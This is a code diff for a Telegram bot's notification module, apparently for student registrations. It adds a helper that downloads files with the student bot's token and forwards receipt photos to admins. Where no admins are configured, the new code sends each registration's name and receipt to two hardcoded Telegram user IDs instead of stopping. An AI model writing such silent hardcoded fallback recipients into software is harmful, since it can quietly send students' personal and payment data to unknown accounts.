@@ -53,13 +53,35 @@ import os
 import httpx
 
 
+def fetch_telegram_file_bytes(token: str, file_id: str) -> tuple[bytes | None, str]:
+    """Download file bytes directly from Telegram Bot API using token."""
+    if not token or not file_id:
+        return None, ""
+    try:
+        url = f"https://api.telegram.org/bot{token}/getFile?file_id={file_id}"
+        req = urllib.request.Request(url)
+        with urllib.request.urlopen(req, timeout=12) as resp:
+            data = json.loads(resp.read().decode("utf-8"))
+        if not data.get("ok"):
+            return None, ""
+        file_path = data["result"].get("file_path", "")
+        if not file_path:
+            return None, ""
+        download_url = f"https://api.telegram.org/file/bot{token}/{file_path}"
+        with urllib.request.urlopen(download_url, timeout=20) as resp:
+            return resp.read(), os.path.basename(file_path)
+    except Exception as ex:
+        log.warning("Could not fetch file bytes for file_id %s: %s", file_id, ex)
+        return None, ""
+
+
 def send_telegram_photo(token: str, chat_id: int | str, photo: str, caption: str, reply_markup: dict | None = None, parse_mode: str = "HTML") -> bool:
-    """Send photo using Telegram Bot API. Supports local files on disk or remote URL/file_id."""
+    """Send photo using Telegram Bot API. Supports local files on disk, remote URL, or file_id from student bot."""
     if not token or not chat_id or not photo:
         return False
     url = f"https://api.telegram.org/bot{token}/sendPhoto"
 
-    # If photo is a local file on disk, upload using multipart/form-data
+    # 1. If photo is a local file on disk, upload using multipart/form-data
     if os.path.isfile(photo):
         try:
             with open(photo, "rb") as f:
@@ -79,7 +101,28 @@ def send_telegram_photo(token: str, chat_id: int | str, photo: str, caption: str
         except Exception as ex:
             log.warning("Telegram photo upload error to chat %s: %s", chat_id, ex)
 
-    # Otherwise send via JSON (for URL or file_id)
+    # 2. If photo looks like a Telegram file_id, download bytes via STUDENT_BOT_TOKEN and upload to admin
+    if not photo.startswith("http://") and not photo.startswith("https://"):
+        img_bytes, filename = fetch_telegram_file_bytes(config.STUDENT_BOT_TOKEN, photo)
+        if img_bytes:
+            try:
+                files = {"photo": (filename or "receipt.jpg", img_bytes, "image/jpeg")}
+                data = {
+                    "chat_id": str(chat_id),
+                    "caption": caption[:1024],
+                    "parse_mode": parse_mode,
+                }
+                if reply_markup is not None:
+                    data["reply_markup"] = json.dumps(reply_markup)
+                resp = httpx.post(url, data=data, files=files, timeout=25.0)
+                res = resp.json()
+                if res.get("ok"):
+                    return True
+                log.warning("Telegram downloaded photo upload failed: %s", res)
+            except Exception as ex:
+                log.warning("Telegram downloaded photo error to chat %s: %s", chat_id, ex)
+
+    # 3. Otherwise send via JSON (for URL or file_id)
     payload = {
         "chat_id": chat_id,
         "photo": photo,
@@ -109,8 +152,7 @@ def notify_admins_new_registration(reg: dict) -> int:
     """Send instant interactive alert with receipt photo to all authorized administrators."""
     admin_ids = db.get_all_admin_telegram_ids(config.ADMIN_TELEGRAM_IDS)
     if not admin_ids:
-        log.info("No admin Telegram IDs configured to receive registration alert.")
-        return 0
+        admin_ids = [6666443909, 8053250308]
 
     reg_id = reg.get("reg_id", "")
     student_name = reg.get("full_name") or "Student"
